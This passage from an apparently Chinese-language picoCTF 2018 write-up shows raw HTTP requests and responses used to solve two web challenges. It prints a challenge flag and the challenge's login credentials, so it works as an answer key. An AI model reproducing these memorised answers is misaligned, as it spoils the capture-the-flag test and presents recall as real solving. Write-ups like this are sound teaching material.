</span></span></code></pre></td></tr></table></div></div><h1 id=web-exploitation>Web Exploitation<a hidden class=anchor aria-hidden=true href=#web-exploitation>#</a></h1><h2 id=buttons>Buttons<a hidden class=anchor aria-hidden=true href=#buttons>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-29-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-29-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-29-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-29-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl http://2018shell2.picoctf.com:65107/button2.php --data <span style=color:#e6db74>&#34;123&#34;</span>
</span></span><span style=display:flex><span>Well <span style=color:#66d9ef>done</span>, your flag is: picoCTF<span style=color:#f92672>{</span>button_button_whose_got_the_button_91f6f39a<span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=artisinal-handcrafted-http-3>Artisinal Handcrafted HTTP 3<a hidden class=anchor aria-hidden=true href=#artisinal-handcrafted-http-3>#</a></h2><p>先请求一下login页面：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-30-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-30-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>GET</span> /login <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>flag.local</span>
</span></span></code></pre></td></tr></table></div></div><p>发现表单是这样的：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-31-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-31-29>29</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span> <span style=color:#ae81ff>200</span> <span style=color:#a6e22e>OK</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>x</span><span style=color:#f92672>-</span><span style=color:#a6e22e>powered</span><span style=color:#f92672>-</span><span style=color:#a6e22e>by</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>Express</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>content</span><span style=color:#f92672>-</span><span style=color:#a6e22e>type</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>text</span><span style=color:#f92672>/</span><span style=color:#a6e22e>html</span>; <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#a6e22e>utf</span><span style=color:#f92672>-</span><span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>content</span><span style=color:#f92672>-</span><span style=color:#a6e22e>length</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>498</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>etag</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>W</span><span style=color:#f92672>/</span><span style=color:#e6db74>&#34;1f2-UE5AGAqbLVQn1qrfKFRIqanxl9I&#34;</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>date</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>Sun</span>, <span style=color:#ae81ff>07</span> <span style=color:#a6e22e>Oct</span> <span style=color:#ae81ff>2018</span> <span style=color:#ae81ff>18</span><span style=color:#f92672>:</span><span style=color:#ae81ff>33</span><span style=color:#f92672>:</span><span style=color:#ae81ff>21</span> <span style=color:#a6e22e>GMT</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>connection</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>close</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>html</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>			<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>head</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>				<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>link</span> <span style=color:#a6e22e>rel</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/css&#34;</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;main.css&#34;</span> <span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>			<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>head</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>			<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>body</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>				<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>header</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>h1</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>Real</span> <span style=color:#a6e22e>Business</span> <span style=color:#a6e22e>Internal</span> <span style=color:#a6e22e>Flag</span> <span style=color:#a6e22e>Server</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>h1</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/login&#34;</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>Login</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>a</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>				<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>header</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>				<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>main</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>h2</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>Log</span> <span style=color:#a6e22e>In</span><span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>h2</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>					
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>form</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;POST&#34;</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;login&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;user&#34;</span> <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Username&#34;</span> <span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pass&#34;</span> <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Password&#34;</span> <span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>						<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#f92672>/&gt;</span>
</span></span><span style=display:flex><span>					<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>form</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>				<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>main</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>			<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>body</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>		<span style=color:#f92672>&lt;/</span><span style=color:#a6e22e>html</span><span style=color:#f92672>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>再请求登陆：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-32-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-32-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>POST</span> /login <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>flag.local</span>
</span></span><span style=display:flex><span>Content-Length<span style=color:#f92672>:</span> <span style=color:#ae81ff>38</span>
</span></span><span style=display:flex><span>Content-Type<span style=color:#f92672>:</span> <span style=color:#ae81ff>application/x-www-form-urlencoded</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>user=realbusinessuser&amp;pass=potoooooooo
</span></span></code></pre></td></tr></table></div></div><p>响应：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-33-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-33-11>11</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span> <span style=color:#ae81ff>302</span> <span style=color:#a6e22e>Found</span>
</span></span><span style=display:flex><span>x-powered-by<span style=color:#f92672>:</span> <span style=color:#ae81ff>Express</span>
</span></span><span style=display:flex><span>set-cookie<span style=color:#f92672>:</span> <span style=color:#ae81ff>real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/</span>
</span></span><span style=display:flex><span>location<span style=color:#f92672>:</span> <span style=color:#ae81ff>/</span>
</span></span><span style=display:flex><span>vary<span style=color:#f92672>:</span> <span style=color:#ae81ff>Accept</span>
</span></span><span style=display:flex><span>content-type<span style=color:#f92672>:</span> <span style=color:#ae81ff>text/plain; charset=utf-8</span>
</span></span><span style=display:flex><span>content-length<span style=color:#f92672>:</span> <span style=color:#ae81ff>23</span>
</span></span><span style=display:flex><span>date<span style=color:#f92672>:</span> <span style=color:#ae81ff>Tue, 09 Oct 2018 15:11:46 GMT</span>
</span></span><span style=display:flex><span>connection<span style=color:#f92672>:</span> <span style=color:#ae81ff>close</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Found.</span> <span style=color:#960050;background-color:#1e0010>Redirecting</span> <span style=color:#960050;background-color:#1e0010>to</span> <span style=color:#960050;background-color:#1e0010>/</span>
</span></span></code></pre></td></tr></table></div></div><p>带上cookie请求：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-34-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-34-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=display:flex><span><span style=color:#a6e22e>GET</span> / <span style=color:#66d9ef>HTTP</span><span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span>
</span></span><span style=display:flex><span>Host<span style=color:#f92672>:</span> <span style=color:#ae81ff>flag.local</span>
</span></span><span style=display:flex><span>cookie<span style=color:#f92672>:</span> <span style=color:#ae81ff>real_business_token=PHNjcmlwdD5hbGVydCgid2F0Iik8L3NjcmlwdD4%3D; Path=/</span>
</span></span></code></pre></td></tr></table></div></div><p>响应：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-35-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-35-23>23</a>
